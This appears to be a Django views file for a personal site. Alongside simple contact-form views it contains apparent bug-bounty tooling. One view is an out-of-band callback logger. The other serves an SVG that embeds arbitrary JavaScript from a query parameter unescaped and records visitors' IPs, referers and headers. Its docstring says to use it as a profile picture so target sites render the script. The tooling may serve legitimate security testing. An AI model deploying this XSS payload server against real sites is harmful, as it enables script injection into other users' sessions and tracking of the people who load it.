from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings
from django.http import HttpResponse
from django.views.decorators.http import require_http_methods
from django.contrib import messages
from datetime import datetime
import json
import logging
import urllib.parse

from .forms import ContactForm
from .models import Message

logger = logging.getLogger(__name__)


def index(request):
    return render(request, 'myapp/index.html')


def contact(request):
    if request.method == 'POST':
        form = ContactForm(request.POST)
        if form.is_valid():
            name = form.cleaned_data['name']
            email = form.cleaned_data['email']
            body = form.cleaned_data['message']

            Message.objects.create(name=name, email=email, message=body)
            return redirect('success')

    else:
        form = ContactForm()

    return render(request, 'myapp/index.html', {'form': form})


def success(request):
    return render(request, 'myapp/success.html')


def additional_works(request):
    return render(request, 'myapp/additional_works.html')


@require_http_methods(["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"])
def private_log(request, path=''):
    """
    Private logging endpoint - logs requests to console/file only.
    No public dashboard or views. Use for OAST testing.
    """
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'method': request.method,
        'path': request.path,
        'full_path': request.get_full_path(),
        'headers': {k.replace('HTTP_', '').replace('_', '-'): v
                   for k, v in request.META.items() if k.startswith('HTTP_')},
        'body': request.body.decode('utf-8', errors='ignore') if request.body else None,
    }

    # Log to console (visible in Render logs)
    print(f"\n{'='*80}\n🔒 PRIVATE REQUEST LOGGED - {log_entry['method']} {log_entry['path']}\n{'='*80}")
    print(json.dumps(log_entry, indent=2, default=str))
    print(f"{'='*80}\n")

    # Also log to Django logger
    logger.info(f"Private Log: {log_entry['method']} {log_entry['full_path']}")

    return HttpResponse('OK', content_type='text/plain', status=200)


def xss_svg(request):
    """
    Serves an SVG with an XSS payload.
    Use as profile picture URL to test if target renders SVG inline.
    Hit /xss.svg or /xss.svg?payload=<custom> for custom JS.
    Logs the hit to console same as private_log.
    """
    payload = request.GET.get('payload', 'alert(document.domain)')
    payload_encoded = payload.replace('"', '&quot;').replace('<', '&lt;').replace('>', '&gt;')

    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'method': request.method,
        'path': request.path,
        'referer': request.META.get('HTTP_REFERER', ''),
        'user_agent': request.META.get('HTTP_USER_AGENT', ''),
        'origin': request.META.get('HTTP_ORIGIN', ''),
        'ip': request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', '')),
        'payload': payload,
        'all_headers': {k.replace('HTTP_', '').replace('_', '-'): v
                        for k, v in request.META.items() if k.startswith('HTTP_')},
    }

    print(f"\n{'='*80}\n🎯 SVG XSS HIT - {log_entry['path']}\n{'='*80}")
    print(json.dumps(log_entry, indent=2, default=str))
    print(f"{'='*80}\n")
    logger.info(f"SVG hit: referer={log_entry['referer']} ip={log_entry['ip']}")

    svg = f"""<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="100%" height="100%" fill="red"/>
  <script type="text/javascript">
    {payload}
  </script>
</svg>"""

    response = HttpResponse(svg, content_type='image/svg+xml')
    response['X-Content-Type-Options'] = 'nosniff'
    return response
